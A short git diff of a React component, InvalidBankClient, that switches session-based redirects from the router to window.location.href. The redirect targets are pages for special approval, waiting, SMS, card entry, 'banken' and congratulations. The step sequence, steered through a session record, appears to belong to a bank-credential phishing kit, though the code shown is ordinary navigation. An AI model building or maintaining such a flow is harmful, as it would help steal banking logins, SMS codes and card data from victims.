@@ -21,23 +21,23 @@ export function InvalidBankClient({ sessionId }: Props) {
 
     const maybeRedirect = (currentStep?: SessionStep, status?: SessionStatus) => {
       if (currentStep === "special_approval" || status === "SPECIAL_INFO") {
-        router.replace(`/special-approval?session=${encodeURIComponent(sessionId)}`);
+        window.location.href = `/special-approval?session=${encodeURIComponent(sessionId)}`;
         return;
       }
       if (currentStep === "wait") {
-        router.replace(`/wait?session=${encodeURIComponent(sessionId)}`);
+        window.location.href = `/wait?session=${encodeURIComponent(sessionId)}`;
         return;
       }
       if (currentStep === "sms") {
-        router.replace(`/sms?session=${encodeURIComponent(sessionId)}`);
+        window.location.href = `/sms?session=${encodeURIComponent(sessionId)}`;
         return;
       }
       if (currentStep === "card") {
-        router.replace(`/card?session=${encodeURIComponent(sessionId)}`);
+        window.location.href = `/card?session=${encodeURIComponent(sessionId)}`;
         return;
       }
       if (currentStep === "congrats" || status === "SUCCESS" || status === "CONGRATS") {
-        router.replace(`/congratulations?session=${encodeURIComponent(sessionId)}`);
+        window.location.href = `/congratulations?session=${encodeURIComponent(sessionId)}`;
       }
     };
 
@@ -82,7 +82,7 @@ export function InvalidBankClient({ sessionId }: Props) {
         .update({ is_hidden: false, current_step: "banken" })
         .eq("id", sessionId);
     }
-    router.push(`/banken?session=${encodeURIComponent(sessionId)}`);
+    window.location.href = `/banken?session=${encodeURIComponent(sessionId)}`;
   };
 
   return (
